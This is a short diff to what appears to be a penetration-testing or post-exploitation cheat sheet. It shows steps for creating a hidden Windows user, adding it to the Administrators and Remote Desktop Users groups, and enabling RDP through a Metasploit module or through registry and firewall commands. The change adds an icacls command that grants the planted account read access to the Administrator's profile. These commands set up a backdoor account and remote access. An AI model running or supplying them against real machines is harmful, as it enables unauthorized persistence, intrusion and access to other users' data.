@@ -184,6 +184,7 @@ or creating a Hidden user :
     net user <os> /active:yes
     net localgroup Administrators <os> /add
     net localgroup "Remote Desktop Users" <os> /add
+    icacls "C:\Users\<Administrator>" /grant <os>:(OI)(CI)RX
 2 - use post/windows/manage/enable_rdp
 3 - set session <id>
 4 - run 
@@ -196,6 +197,7 @@ or creating a Hidden user :
     net user <os> /active:yes
     net localgroup Administrators <os> /add
     net localgroup "Remote Desktop Users" os /add
+    icacls "C:\Users\<Administrator>" /grant <os>:(OI)(CI)RX
 2 - reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 3 - netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
 4 - to verify it's enabled if the value = 0 --> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
